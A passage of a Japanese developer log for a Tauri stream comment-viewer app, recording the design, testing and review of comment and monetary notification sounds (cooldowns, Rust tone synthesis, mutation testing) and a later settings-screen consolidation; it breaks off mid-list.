`typecheck` OK ／ `lint` OK ／ `pnpm test` **705 passed**（38 files・059a 分は 49 本＝新規 3 本と 1 本の書き直し。
CSS guard OK・version sync OK）。Rust は差分を追加していないので `cargo test` **155 passed** のまま。

### テストの穴埋め（レビュー対応の続き・2026-08-04）

「ユニットテストで埋められるものは埋める」方針で、**仕様ベースで穴を洗い出して 11 本追加**した
（frontend 705 → **715**／Rust 155 → **156**）。⚠ **追加した各テストは、対応する退行を実際に注入して
赤くなることを確認している**（緑を増やすだけのテストは書かない）。

- ⚠⚠ **Rust: `decay_tau` が波形に反映されているかを誰も検査していなかった。**
  `every_sound_decays_with_its_declared_time_constant` を追加＝「**`t = decay_tau` で包絡がピークの 1/e**」
  という指数減衰の定義そのものを検査する（実装の式ではなく仕様を見ている）。
  ⚠ **実測: `samples_for` の tau 導出を 058a の固定式（`duration / 3`）へ戻すと、この新テストだけが赤くなり、
  既存の波形テスト 4 本（クリップ／無音始まり終わり／宣言長／音の一意性）は全部緑のままだった**
  ——`decay_tau` を `ToneSpec` へ出した意味が、これまで機械的には守られていなかったことになる。
- ⚠⚠ **`"skipped"` を `"failed"` 扱いにする退行が誰にも殺されなかった**（ミューテーションで発見）。
  既存の「skip では消えない」テストは failed が**先に立っている**状態を見ているので、逆向き
  （skipped で立ててしまう）を検出できない。**成功 → クールダウンで skip → 赤字が立たない**を追加。
  これが無いと「連投のたびに『再生できません』が出て、正常動作が故障に見える」退行が素通りする。
- **設定変更が受信経路へ届くこと（ref 同期）と、その届け方が「窓内 WS 1 本」を壊していないこと**を新設。
  ①デバイスを選び直したら次のコメントは新しいデバイスで鳴る（stale closure なし）
  ②OFF 起動から設定で ON にすれば次のコメントで鳴る（**既定 OFF なのでこの経路が壊れると機能が使えない**）
  ③⚠⚠ **設定を触ってもコメント接続は張り直さない**（`playCommentNotification` を `useCallback([])` から
  外すと赤くなることを実測。通知音の設定を触っただけで配信中のコメント取得が切れる、を止める）
  ④ON/OFF の永続と開き直しでの復元。
- **継続表示が消える 4 経路のうち、テストが無かった 2 つ**（試聴の成功・デバイスの選び直し）を追加。
  いずれも該当行を消すと赤くなることを実測。
- **§9 追補(046a)**: コメントを受信しても localStorage に**本文・表示名・デバイス名**が入らないことを
  `CommentViewerApp` レベルで固定（`soundPrefs.test.ts` の関数単位の検査だけでは配線を見ていなかった）。
- **`test` のクールダウンが 0**（ユーザーの明示操作にレート制限をかけない）を明示的に固定。

⚠ **作業ルール**: ミューテーションを試すときのバックアップは scratchpad への `cp` で取る。
**`git checkout` は使わない**（未コミットの実装を消す。上の「作業事故」参照）。

## 2026-08-04 (059b 投げ銭通知音 —— コメント音とは別音・排他・独立クールダウン・Rust の同時再生 1 本への譲り)

`docs/tasks/059b-monetary-notification-sound.md` を実装。**058a（`122ebd6`）と 059a（`e437a57`）の上に
2 音目を足すだけ**で、基盤は作り直していない。⚠ **タスクファイルは実装前に ②-軽版へ全面的に書き直した**
（059a と同じ手順）。実機確認（耳での聞き分け・デバイス抜き差し）は**本人の手番で未実施**。

### ⚠ 旧タスクファイルから失効していた前提（実コードで追認・訂正した）

| 旧版の記述 | 現在の正 |
| --- | --- |
| 2 つ目の**音源を同梱**・**ライセンス確認**・base64 定数 | 音は Rust で合成（`tone_spec` に 1 アーム）。**同梱物が無いのでライセンスの論点が発生しない** |
| `sound-monetary-stream-output`（配信に載せるか） | 作らない（②-軽では「通知音＝選んだ実デバイス＝載らない」で固定。切替先＝OS 既定は載る側なので fail-closed が壊れる） |
| 音量は 059a の `sound-volume` を共有 | **共有すべきキーが存在しない**（059a が作らないと決めた）。振幅は Rust の `PEAK_AMPLITUDE` 固定 |
| 「Rust・依存はすべて差分ゼロ」 | **`src/audio/` に差分が出る**。依存 / capabilities / `tauri.conf.json` / sidecar は差分ゼロのまま |
| レビュー「軽レビュー」 | **security-review 必須**（059a の是正で条文化済み） |
| **「表示側と同じ `displayEventType` を使うこと」** | ⚠⚠ **誤り。訂正した**（下記） |
| 「投げ銭音のクールダウンはコメント音より**短くて**よい」 | ⚠ **反転した**（下記） |

### ⚠⚠ 課金判定 —— 申し送りの文言どおりに書くとビッツで鳴らない

タスクファイルと task-board の申し送りは「表示側と同じ `displayEventType` を使うこと」だったが、
**素直に `isMonetaryEvent(displayEventType(c))` と書くとビッツで投げ銭音が鳴らない**。3 案を実コードで検証した:

| ケース | **採用**: `isMonetaryEvent(c.eventType)` | `displayEventType(c) !== "chat"` | `isMonetaryEvent(displayEventType(c))` |
| --- | --- | --- | --- |
| **ビッツ**（`superchat` + `currency:"BITS"`） | `superchat` ∈ SET → **true ✅** | `"bits"` ≠ chat → true ✅ | `"bits"` ∉ SET → **false ❌** |
| スパチャ（`superchat` + JPY） | true ✅ | true ✅ | true ✅ |
| **未知種別**（上流が `raid` 等を足したとき） | false（コメント音）✅ | **true ❌ 誤爆** | false ✅ |
| 通常 chat | false ✅ | false ✅ | false ✅ |

- **申し送りが誤った原因**: `CommentList` には分岐が **2 つ**あり、本体一覧（`renderDefaultItem`）は
  `isMonetaryEvent(c.eventType)`、オーバーレイ（`renderOverlayItem`）だけが `displayEventType(c) !== "chat"`。
  **申し送りはオーバーレイ側だけを見て書かれていた。**
- **採用理由**: ①`MONETARY_EVENT_TYPES` の JSDoc が「ビッツは superchat に含まれる」と明記＝
  **生の `eventType` に適用する前提の述語**で、表示ラベル用の語彙を食わせるのはカテゴリエラー
  ②本番の既存呼び出しは採用案が **4 か所**（049 読み上げ優先キュー / 047 ティッカー / 043b 本体カード / 固定帯）で、
  もう一方は 1 か所だけ＝「判定を 2 実装に分裂させない」を実際に満たすのは採用案だけ
  ③オーバーレイの「chat 以外は課金カード」は見た目が違うだけの安全な劣化だが、**音で同じことをすると
  未知種別に「投げ銭が来た」と嘘をつく**＝劣化の向きが逆。
- **タスクファイルと task-board の申し送りを訂正**し、コードにも「なぜ申し送りどおりにしないのか」を注記した。

### ⚠⚠ Rust の「同時再生 1 本」との衝突 —— クールダウンの独立だけでは「必ず鳴る」は成立しない

**本タスク最大の設計判断。** 058a の `PLAYING` は音の種類に関係なく全体で 1 本で、競合した呼び出しを
**鳴らさずに `Ok(())`** で返す＝frontend からは `"played"` に見えて**検出できない**（059a が受容済みの既知の弱点）。

- **発生確率の見積もり**: コメント音の占有は 150〜350ms（音 140ms ＋ `PLAYBACK_TAIL` 80ms ＋ デバイス再列挙
  ＋ stream open ＋ ポーリング粒度）、コメント音が鳴りうる最短間隔はクールダウンの 600ms。
  → **コメントが流れ続けている配信では占有率 25〜58%**。スパチャの到着は無相関なので
  **2〜4 回に 1 回、投げ銭音が黙って捨てられる**。（2 秒に 1 件程度の流量なら 8〜18%。）
- **採った対策 = ③ 飛行中の再生 Promise に連結**（`notificationSound.ts` の `WAITS_FOR_IN_FLIGHT`）。
  `play_notification_sound` は鳴り終わってから resolve し、`PlaybackGuard` は `play_on_device` の末尾で
  drop される＝**IPC 応答より先に `PLAYING` が false になる**ので、待った先ではほぼ確実にガードを取れる
  （⚠ **「必ず」ではない**——レビュー S-2 で訂正。詳細は下記「レビュー反映」）。
  上限は Rust 側（`PLAYBACK_GRACE` 1 秒）が持つので無限待ちにならない。
- **見送った案**: ①受容（25〜58% は「たまに」で済まず、本タスクの核心を諦めることになる）
  ②固定遅延で 1 回だけ再試行（**成否が分からないので盲目的**＝成功していたら二重に鳴る。Rust の占有時間を
  frontend が推測する二重管理になり `PLAYBACK_TAIL` を変えると静かに壊れる）。
- ⚠ **`PLAYING` / `PlaybackGuard` は 1 行も触っていない**（レビュー必須条件が名指し）。上流で譲るだけ。
- ⚠ **`comment` は待たせない**（059a の挙動を 1 ビットも変えない）。結果として「投げ銭音の再生中に来た
  コメント音は Rust に落とされうる」が、**落ちてよいのはコメント音の側**なので優先順が正しい向きに出る。
- ⚠ 連結先が解決した**同じマイクロタスク**で invoke が走るので、その隙間にコメント音が割り込む余地は無い
  （コメント受信は WS メッセージ＝マクロタスク）。副作用として、飛行中の再生が無くても投げ銭音の invoke は
  **1 マイクロタスク遅れる**（無害だが、テストで「呼ばれた」を見る前に 1 回 await が要る）。

### クールダウン —— `monetary: 1500ms`（⚠ 旧計画の「短くてよい」を反転）

1. **下限は Rust の占有時間**。投げ銭音は 300ms ＋ `PLAYBACK_TAIL`(80ms) ＋ 列挙/open で実占有 **400〜550ms**。
   1500ms はその約 3 倍。⚠ **実機で下げるときも 600ms は下回らないこと**（音が長いぶんコメント音より下限が高い）。
2. **上限は「凌ぐ」対象で決まる（反転の理由）**。Twitch のコミュニティギフトは `community_sub_gift(total=N)` と
   個別 `sub_gift`×N の両方が届き **N+1 行**になる（043a の既存課題。ここでは解消せず凌ぐ）。600ms では
   到着のばらつきで 2〜3 回鳴る。**1500ms なら 1 回に潰れる。**
3. **体験上の上限**。1.5 秒に 1 回鳴れば「見逃さない」目的は満たす。これ以上伸ばすと
   「別の視聴者からの 2 件目に気づけない」側が効き始める。
4. コメント音（600ms）とは独立なので、この 1500ms がコメント音を間引くことはない（逆も同様）。

### 音のパラメータ（**アプリ内合成・ライセンス対象の同梱物はゼロ**）

| 音 | 周波数 | 長さ | 減衰時定数 |
| --- | --- | --- | --- |
| `Test`（058a） | 880 Hz (A5) | 180 ms | 60 ms |
| `Comment`（059a） | 660 Hz (E5) | 140 ms | 23 ms |
| **`Monetary`（059b）** | **440 Hz (A4)** | **300 ms** | **90 ms** |

- **3 音を続けて鳴らしても聞き分けられる**ことが唯一の設計目標で、**音高・長さ・余韻の 3 軸すべて**で離した。
  音高＝A4 は Test の 1 オクターブ下・Comment の完全 5 度下／長さ＝Comment の 2.1 倍（音高が聞き取れなくても
  時間軸で判別できる）／余韻＝Comment の約 4 倍（「ポッ」対「ポーン」）。
- ⚠ **倍音は足していない。** 重みの和を 1 以下にすれば `every_sound_never_clips` は保てるが、
  `every_sound_decays_with_its_declared_time_constant` が「1 周期窓の最大値 ≒ 包絡」という前提で下限 0.90 を
  切っているため、**倍音の位相干渉で下振れしてレッドになりうる**。1 音足すために契約テストの許容帯を緩めるのは
  順序が逆。**再修正トリガー＝実機で「区別はつくが安っぽい」と感じたとき**（倍音とテスト側の前提をセットで見直す）。
- ⚠ **「区別できる」はテストで担保できない**ので実機確認の項目にした。テストが止めるのは「値がまるごと同一」まで。
- **第三者素材を配布バイナリに入れないので、059 が親から引き継いでいたライセンス確認の宿題は 059b でも発生しない。**

### `added` の既知性質 Q-1 —— **受容した**

`MAX_COMMENTS` のクランプで表示から落ちた jewels 行に後から combo 更新が届くと `added` に載るため、
排他判定を `added` の中身で行う 059b では「200 件前のスパチャの投げ銭音が鳴り直す」。受容の理由:

1. **鳴っても嘘ではない**——combo 更新は実際に追加のジュエルが贈られたイベントで、「200 件前」なのは
   表示行の話であって金銭の発生は今である。
2. 発生条件は「初報と combo 更新の間に 200 件流れる」で、043e が「combo 更新は数秒以内に届くため稀」と実測済み。
3. `ttsQueue.seenIds` 相当の Set を通知音のためだけに持つと**無限に増える集合**を抱え、059a の冪等化
   （クールダウン）と防波堤が 2 系統になって「どちらが効いたか」が読めなくなる。

**再修正トリガー＝`MAX_COMMENTS` を大幅に下げる／combo 更新が数十秒後に届く実データを観測したとき。**

### 実装で効いた設計判断

- **`playCommentNotification` → `playBatchNotification` へ改名。** 2 音のどちらを鳴らすかを決める関数に
  なったので、旧名だと「コメント音を鳴らす関数」に読め、**この関数の一番大事な責務（排他）が名前から消える**。
- **排他は ON/OFF より先に効く**（本人決定）。バッチの代表音を先に決め、その音の ON/OFF だけを見る＝
  投げ銭音 OFF の混在バッチは**無音**（コメント音へフォールバックしない）。「投げ銭音を OFF にしたのに
  スパチャでコメント音が鳴る」を避けるため。sidecar は 1 件ずつ送るので混在バッチ自体が稀。
  **再修正トリガー＝実機で「スパチャのときだけ無音になるのが不便」と感じたとき。**
- **試聴の state（`soundPreviewState`）は 2 音で共有した。** 059a が `audioTestState` と分けた理由は
  **別カードだから**で、こちらは同じカード・同じデバイス・同じ復旧手順＝案内文が音種で変わらない。
  むしろ共有だと**片方の再生中はもう片方も disabled** になり、**Rust の同時再生 1 本と一致する**
  （分けると再生中にもう片方を押せてしまい、Rust に黙って捨てられて「押したのに鳴らない」になる）。
  取り違えを殺す配線テストが 3 すくみにならずに済む副産物もある。
- **未選択の赤字とツールバー indicator のゲートを 2 音の OR に広げた。** 赤字は**1 本のまま**
  （同じ状態を 2 つの言葉で二重に叱らない）。indicator の OR は必須で、**片方だけ ON の状態で
  デバイスを抜いたときに黙って鳴らなくなる**のを防ぐ＝この indicator の存在理由そのもの。
- **試聴ボタンを「コメント音を試聴 ▶」「投げ銭音を試聴 ▶」へ改名。** 3 つ目を足す前に改名したのは、
  ①どちらの音か画面から読めなくなる ②**034c の話者試聴ボタンも「試聴 ▶」で、実機では同じアクセシブル名が
  並んでいた**（既存の取り違えもここで解消した）。
- **`resetNotificationSoundCooldownForTest` → `resetNotificationSoundStateForTest` へ改名。**
  消す対象がクールダウンだけでなくなった（`lastPlayback` も消す）のに旧名のままだと、消し忘れるか
  消していることに気付かないかのどちらかが必ず起きる。

### テスト

| ファイル | 追加内容 |
| --- | --- |
| `notificationSound.test.ts` | `monetary` のクールダウン（1500ms・**コメント音より長いこと**）／**コメント音の直後の投げ銭音が鳴る**（両方向）／**飛行中 Promise への連結**（待つ・失敗でもチェインが切れない・`comment` は待たない） |
| `soundPrefs.test.ts` | 未保存 / 不正値 6 種 / 例外のフォールバック／往復／このキー以外を書かない／**2 キーが互いに干渉しない** |
| `CommentViewerApp.notificationSound.test.tsx` | 排他 3 ケース／**ビッツ**／課金 5 種別／**未知種別はコメント音**／`updated` 無音／排他が ON/OFF より先／ON/OFF の独立（両方向）／fail-closed／**N+1 ギフト**／indicator ゲートの OR／永続化・WS 非再接続／§9（金額も含めて漏れない） |
| `SettingsView.audio.test.tsx` | 投げ銭トグル（既定 OFF・配線）／2 トグルの独立／**2 つの試聴が別ハンドラ**／未選択で両方 disabled／再生中は両方 disabled／赤字が OR かつ 1 本 |
| Rust | `ALL_SOUNDS` に 1 つ足すだけ＝**波形の不変条件テスト 5 本が自動で新しい音にも適用される**（新規テストは追加していない） |

#### ⚠ 途中で見つけた 2 つの空振り（同じ失敗を繰り返さないための記録）

1. **059a の「`updated` では鳴らさない」テストが空振りになっていた。** combo 再送を起こす種別は jewels だけで、
   jewels は課金＝059b 以降は**投げ銭音の経路**になる。059a のセットアップ（コメント音だけ ON）のままだと
   「投げ銭音が既定 OFF だから鳴らなかった」で緑になる。**両方 ON にする形へ書き直して 059b の describe へ移した。**
   → 教訓: **既存テストが扱う題材が新機能の経路へ移ったら、そのテストは黙って空振りになりうる。**
2. **N+1 ギフトのテストがクールダウン値に依存していなかった。** 6 バッチを連続して `receive` すると全部が
   同一 tick に入り、**クールダウンが 1ms でも 1 回に潰れて緑**になる（ミューテーション④で実測）。
   `Date.now` を差し替えて**到着の広がり（1 件 250ms・6 件で 1250ms）を再現**する形へ書き直した。値は
   「1500ms にぎりぎり収まる広がり」で、**縮めると必ず落ちる**ように選んである（600ms なら 2 回・300ms なら 3 回）。
   → 教訓: **「クールダウンで潰れること」を主張するテストは、時間を進めないと何も固定していない。**

#### ミューテーションで実効性を確認（実施済み・2026-08-04）

| # | 変異 | 結果 |
| --- | --- | --- |
| ① | 排他の分岐を「両方鳴らす」に書き換え | **レッド 5 件** |
| ② | `COOLDOWN_MS` を共有カウンタに書き換え | **レッド 6 件** |
| ③ | 課金判定を `isMonetaryEvent(displayEventType(c))` へ | **レッド 1 件**（ビッツのみ＝狙いどおり） |
| ③b | 課金判定を `displayEventType(c) !== "chat"` へ | **レッド 1 件**（未知種別のみ＝狙いどおり） |
| ④ | `monetary` のクールダウンを 300ms へ／600ms へ | **レッド 3 件／3 件**（⚠ 600ms は当初「1 件」と記録していたが実測 3 件。レビューでの再現時に訂正） |
| ⑤ | 飛行中 Promise への連結を外す | **レッド 1 件** |
| ⑥ | `lastPlayback` を「置き換え」に戻す（レビュー Q-1 の修正前の形） | **レッド 1 件**（レビューで追加。修正前は 0 件＝空振り） |
| ⑦ | `playBatchNotification` の未選択ガードを削除（レビュー Q-2 の修正前の形） | **レッド 2 件**（レビューで追加。修正前は 0 件＝空振り） |

### 変更ファイル

Rust: `audio/model.rs`（`Monetary` unit variant）／`audio/service.rs`（`tone_spec` 1 アーム＋テストの
`ALL_SOUNDS`・`sound_label`）。**`commands.rs` / `mod.rs` / `error.rs` / `lib.rs` / `Cargo.toml` は差分ゼロ。**
frontend: `notificationSound.ts` / `soundPrefs.ts` / `CommentViewerApp.tsx` / `SettingsView.tsx`
＋テスト 5 ファイル（`SettingsView.obs.test.tsx` は `baseProps` に 3 props を足しただけ）。
bindings: `NotificationSound.ts`（`cargo test` が再生成）。
docs: `059b` タスクファイル（全面改訂）／`task-board.md`／本ファイル／
**`security.md` は §4 追補〈058a〉の 1 行のみ**（鳴らせる音の列挙を 2 音→3 音へ事実追随。ポリシーは無改変）。

### ゼロ拡大の実測（すべて差分ゼロを確認）

`capabilities/` ／ `tauri.conf.json` ／ `apps/comment-sidecar/` ／ `.github/` ／
`Cargo.toml` ／ `Cargo.lock` ／ `package.json` ／ `pnpm-lock.yaml` ／
`ttsQueue.ts` ／ `voicevox.ts` ／ `voicevoxPreview.ts` ／ `audioOutputApi.ts` ／ `audioOutputPrefs.ts` ／
`audio/commands.rs` ／ `viewerFormat.ts` ／ `CommentList.tsx` ／ `mergeComments.ts` ／
`CommentViewerApp.module.css`（**CSS 差分ゼロ**）。

`audio/service.rs` の**削除行は 4 行だけ**（doc コメント 2 行 ＋ `ALL_SOUNDS` の 2 行）＝
**契約テストは 1 本も緩んでいない**。`PLAYING` / `PlaybackGuard` / `find_output_device` /
`is_selectable_device_id` は無改変（`git diff -U0` で確認。ヒットはコメント 1 行のみ）。

### 検証

- `cargo check` ✅ ／ `cargo test` ✅ **156 passed**（`audio::` は 19 passed）
- `pnpm typecheck` ✅ ／ `pnpm lint` ✅ ／ `pnpm test` ✅ **768 passed / 38 files**
  （＋ CSS guard check OK ／ Version sync check OK）
- `grep unwrap()/.expect(` → **ヒット 2 件はどちらも 058a 由来**（doc コメントと `#[cfg(test)]` 内）＝059a と同じ

### レビュー

- **セルフ security-review 実施（2026-08-04）＝修正必須 0 件。** 指定 5 観点（①契約テスト無改変
  ②`PLAYING`/`PlaybackGuard` 無改変 ③`Monetary` が unit variant ④fail-closed が 4 経路
  ⑤§9）すべて実コードで確認。指摘は「`security.md` §4 追補の音の列挙が 2 音のままで実態とずれる」1 件で、
  **本人確認のうえ 1 行だけ事実追随**（ポリシー・レビュー必須条件は無改変）。
- **独立した security-review ＋品質レビュー実施（2026-08-04）＝修正必須 0 件・セキュリティ逸脱ゼロ。**
  契約テストの削除行 4 行・`PLAYING`/`PlaybackGuard` 等の無改変・unit variant・fail-closed 4 経路・
  §9・マイク非接触・ゼロ拡大・panic 経路ゼロ・`security.md` 差分 1 行を**すべて実測で追認**。
  ミューテーション 6 種も再現し、①5 件 ②6 件 ③1 件 ③b 1 件 ④300ms 3 件 ⑤1 件が主張どおりであることを確認。

#### レビュー反映（下記はすべて本記録の後で適用済み）

| # | 指摘 | 対応 |
| --- | --- | --- |
| Q-1（中） | `lastPlayback` が「最後に**完了する**再生」ではなく「最後に**invoke した**再生」＝Rust に捨てられて即解決したコメント音が、飛行中の投げ銭音を**追い越して巻き戻す**。1 回の占有が 800ms 程度の環境では、059b が潰したはずの「黙って捨てられる」が復活する | **修正**。`lastPlayback = started` の置き換えをやめ、`lastPlayback.then(() => started)` で**両方が終わったら**に変更（`started` は生成済みなので invoke は増えない＝キューにはならない）。巻き戻りを固定するテストを追加（ミューテーション⑥） |
| Q-2（中） | fail-closed の**アプリ層**ガードがテストで固定されていない。`playBatchNotification` の未選択ガードを削除しても**全件緑のまま通る**（下流の同じガードが `"skipped"` を返すため）＝多層防御の 1 層が空振り | **修正**。2 本の未選択テストに `requestNotificationSound` が呼ばれないことの assert を追加（ミューテーション⑦） |
| Q-3（中） | 「投げ銭音 OFF ＋混在バッチ＝無音」が `.note` から読めない。文言が**投げ銭音 ON 前提**で書かれており、OFF のユーザーは「スパチャのときだけ音が消える」原因にたどり着けない | **修正**。`.note` に「この通知音を OFF にすると、投げ銭のときはコメント通知音も鳴りません（無音になります）」を追加（CSS 差分ゼロ）＋文言を固定するテストを追加 |
| Q-4（低） | ミューテーション表 ④ の「600ms → レッド 1 件」が実測 3 件（記録が不正確・安全側のずれ） | **修正**。本ファイルと 059b タスクファイルの表を訂正 |
| Q-5（低） | StrictMode の updater 二重実行に対する冪等化テストが `monetary` に無い（機構は共有だが「クールダウン判定を await の後ろへ動かす」退行を検出できない） | **修正**。投げ銭音版のテストを追加 |
| Q-10（低） | 059b の describe を**既存 describe の途中に差し込んだ**結果、059a の 5 本（`test` のクールダウン 0・未選択・失敗の扱い）が「同時再生 1 本への譲り」の下に取り残されていた | **修正**。グルーピングのみ戻す（中身は無改変） |
| S-2（低） | 「待った先で**必ず**ガードを取れる」は保証として強すぎる（解決〜再 invoke 到達の窓に試聴／同時刻のコメント音が割り込みうる） | **コメントのみ**。`WAITS_FOR_IN_FLIGHT` の JSDoc・本ファイル・タスクファイルの表現を「ほぼ確実に」へ訂正。前提の前半（**drop 順により IPC 応答より先に `PLAYING` が false になる**）はレビューで検証され正しい |
| Q-6（低） | 試聴が `lastPlayback` に載らない割り切りの帰結として、**コメント音の再生中に試聴を押すと無音になる**（共有 `soundPreviewState` が潰せているのは試聴どうしの衝突だけ） | **コメントのみ**（受容）。押し直せば鳴る。再修正トリガー＝設定画面を開いたまま配信する運用が常態になったとき |
| Q-7（低） | 待たない側は `playNotificationSound` を直に呼ぶので、**同期 throw** すると「例外を投げない」契約から漏れる（059a 由来） | **コメントのみ**（受容）。`invoke` は Promise を返すので同期 throw は現実的に起きず、包むと待たない音まで 1 マイクロタスク遅れて StrictMode の同期前提テストが崩れる。再修正トリガー＝`audioOutputApi` が invoke 以外の同期処理を持つようになったとき |

#### レビュー後に追加したテスト（仕様は書いてあったが固定されていなかったもの・2026-08-04）

| テスト | 固定した仕様 | 出典 |
| --- | --- | --- |
| `every_pair_of_sounds_differs_on_all_three_axes`（Rust） | **どの 2 音も 音高・長さ・余韻の 3 軸すべてが異なる** | `model.rs` の `Monetary` doc「3 音続けて鳴らしても聞き分けられる値にしてある（3 軸すべてを離した）」。⚠ 既存の `every_sound_has_a_distinct_tone` は **(周波数, 長さ) のタプル一致**しか見ないので、「音高だけ Comment と同じ 660Hz にする」変更が**素通しだった**（実測で確認） |
| `⚠ 待っている間に来た投げ銭音はクールダウンが落とす` | 待ちが発生している最中でも**溜めない**（キューにしない） | 親 059「キューイングしない・落とすのが正しい」＋`lastPlayback` の「溜め込むキューではない」 |
| `⚠ 投げ銭音のクールダウンは「要求した時刻」から数える` | 記録は**待ち始めた時点**＝待った時間ぶんクールダウンが伸びない | `lastRequestedAt` の「最後に**要求した**時刻を記録する」＋`requestNotificationSound` の同注記 |
| `⚠ 'test' も待たない` | **ユーザーの明示操作は絞らない**（`WAITS_FOR_IN_FLIGHT.test = false`） | `COOLDOWN_MS.test = 0` と対。将来この関数を通すようにしたとき「押したのに待たされる」へ倒れないための固定 |
| `§9: 投げ銭で失敗しても継続表示に金額・投稿者名・本文・例外の中身を出さない` | **警告文は固定文字列**（音種でも失敗理由でも変わらない） | §9 追補（058a のデバイス名／046a の第三者データ）。⚠ **059b で「金額」という新しい機微が経路に入った**ため、コメント音側とは別に見る。対象は indicator の文言と title だけ（コメント本体は表示されるのが正しい） |

⚠ **Q-8（音のパラメータの余裕）はレビューで計算により追認**——`Monetary` の
`every_sound_decays_with_its_declared_time_constant` の実測比は **≈0.999**（許容帯 `[0.90, 1.02]`）。
1 周期窓が 2.29ms に対し tau が 90ms と長いため窓内で包絡がほとんど落ちず、既存 2 音より余裕がある。
**倍音を足さない判断も支持された**（テストの前提と衝突するため、緩めるのは順序が逆）。

### ⚠ 実機確認は未実施（本人の手番）

`tauri dev` での確認項目は 059b タスクファイルの「確認コマンド」節の ①〜⑨。とくに:
**①3 音（テスト再生 / コメント音 / 投げ銭音）を続けて鳴らして聞き分けられるか**、
**③通常コメントを流し続けている最中のスパチャで必ず鳴るか**（＝飛行中 Promise への連結が効いているか）、
**④ビッツで鳴るか**（課金判定の実機確認）、
**⑧投げ銭音だけ ON の状態でデバイスを抜いたとき indicator が出るか**。

### やらないこと（線引き・再修正トリガー付き）

- **金額での出し分け**（一律 1 種類）。⚠ **再修正トリガー＝「高額だけ別の音にしたい」**と言われたら
  `monetaryTone()` を音にも使う形で拡張する（variant がティアぶん増えるので security-review が要る）。
- **N+1 ギフトの二重計上の解消**（043a から残る既存課題。ここでは凌ぐだけ）。
- **音量**（キーを作らない。まず `PEAK_AMPLITUDE` を調整し、それでも足りなければ別タスク）。
- **「配信に載せる」トグル**（②-軽では成立しない）。
- **読み上げ（VOICEVOX）の変更**・**同時再生 1 本の上限の変更**・**課金判定そのものの変更**。

## 2026-08-04 (059c 設定画面の「通知音」統合 —— 音声出力カードを吸収・テスト再生を廃止・出力先を条件表示)

**本人指示による UI 再編。** タスクファイルは作らず本節を記録の正とする（本人決定）。
機能追加ではなく**設定画面の構造変更**で、鳴らす仕組み（`notificationSound.ts` / `soundPrefs.ts` /
`playBatchNotification` / Rust）には一切触れていない。

### 指示（原文の要点）

1. 「音声出力（通知音）」と「通知音」の 2 カードを **1 つの「通知音」項目にまとめる**。
2. **コメント通知音か投げ銭通知音を ON にしたときだけ**出力先の項目を出す。
3. **テスト再生は不要**。再読み込みボタンのみにする。
4. 2 つの試聴ボタンは **「通知音を試聴」という共通の名前**にし、**それぞれのトグルの下**に置く。
5. 投げ銭通知音の説明から **「既定は OFF」「コメント通知音と同時に鳴らない」「OFF のときの動作」を消す**。

### ⚠⚠ 058a / 059a / 059b の記述で失効したもの（次に触る人へ）

| どこ | 旧記述 | 現在の正 |
| --- | --- | --- |
| `docs/tasks/058a` | 「読み上げカードの直後に**「音声出力（通知音）」カード**を新設」 | カードは消滅。統合後の「通知音」カード内の**出力先セクション**になった |
| `docs/tasks/058a` | 「設定ビューに…カードがあり、デバイスを選べ、**テスト再生でき**」 | テスト再生は無い。出力先の検証は**試聴**が兼ねる |
| `docs/tasks/059a` | 「**新カード「通知音」**を『音声出力（通知音）』カードの**直後**に新設」 | 1 枚に統合済み（前後関係という概念が無くなった） |
| `docs/tasks/059a` | indicator の `title` は「設定の**「音声出力（通知音）」**でデバイスを選び直す…」 | 「設定の**「通知音」**で…」へ変更 |
| `docs/tasks/059b` ／ task-board | 試聴ボタンは「**コメント音を試聴 ▶**」「**投げ銭音を試聴 ▶**」 | どちらも「**通知音を試聴 ▶**」（同名 2 つ） |
| 059b レビュー Q-3 の反映 | 投げ銭の `.note` に「OFF にすると投げ銭のときはコメント通知音も鳴りません」 | **削除**（下記 ⚠ を参照） |
| `SettingsView.tsx` | `AudioTestState` 型・`onTestNotificationSound` / `audioTestState` props | **削除**（`SoundPreviewState` のみ残る） |

### ⚠ レビュー Q-3 の指摘を、本人判断で不採用にした

削除した「OFF にすると投げ銭のときはコメント通知音も鳴りません（無音になります）」は、
**059b の品質レビュー Q-3 で「必須」として足したもの**である。消したことで
**「投げ銭通知音 OFF ＋ コメント通知音 ON」でスパチャが来ると完全に無音になる**理由が、
画面のどこからも読めなくなった（排他は ON/OFF より先に効くため）。

- **挙動は変えていない**（「投げ銭音を OFF にしたのにスパチャでコメント音が鳴る」を避ける決定は不変）。
- 判断の根拠と再修正トリガーは `SettingsView.tsx` の投げ銭トグル直上のコメントに残した。
- **再修正トリガー＝実機で「スパチャのときだけ鳴らない」と混乱したとき。** そのときは
  ①説明文を戻す ②排他より ON/OFF を先に見る（投げ銭音 OFF ならコメント音へフォールバック）
  のどちらかを選ぶ。

### 実装で効いた判断

- **出力先の条件表示は「どちらかの音が ON」の OR。** 両方 OFF なら鳴らないので出力先を選ぶ意味が無い。
  ⚠ **列挙（`listAudioOutputDevices`）は設定ビューを開いた時点で走る**（`view !== "settings"` の effect）ので、
  この条件表示で列挙のタイミングは変わらない＝ON にした瞬間に一覧は揃っている。
  ⚠ **トグルと試聴ボタンは条件表示に含めない**（含めると OFF から ON へ戻せなくなる）。
- **未選択の赤字から位置参照を落とした**（旧「上の『音声出力（通知音）』で〜」）。統合で参照先が消えたため。
- **「配信に載る/載らない」の説明は出力先セクションの `.note` に一本化した。** 各トグルの `.note` から
  同趣旨の文を落としたので、**ここが唯一の置き場所**になっている（テストで固定した）。
- **`NotificationSound::Test` は Rust に残した。** UI から呼ばれなくなるが、enum から消すと
  `src-tauri/src/audio/` の本番コードに差分が出て `docs/security.md` の「レビュー必須条件」に該当し、
  security-review のやり直しになる。**Rust は差分ゼロ**（`docs/security.md` も無改変）。
- **試聴ボタンは表示名もアクセシブル名も完全に同一**（本人決定・`aria-label` を付けない）。
  ⚠ 帰結として ①スクリーンリーダーでは 2 つを区別できない ②テストは `getAllByRole` の並び順で引く。
  取り違えを黙って見逃さないよう、**引いた直後に `title` を assert して並び順を明示検証する**
  ヘルパ（`previewButtons()`）を 2 ファイルに置いた。
  **再修正トリガー＝押し間違いが実際に起きたとき**（表示名は変えずに `aria-label` で区別する＝
  可視ラベルを含むので WCAG 2.5.3 も満たす）。

### テスト（差し引き ±0 ／ 全 775 passed）

**削除 8 本**（仕様そのものが消えたもの）:
テスト再生の配線・disabled・再生中・失敗表示（`SettingsView.audio` 4 本）／`"test"` 音を鳴らす
（`CommentViewerApp.audio` 1 本）／「テスト再生が成功しても赤字が消える」「試聴の失敗が 058a のカードへ
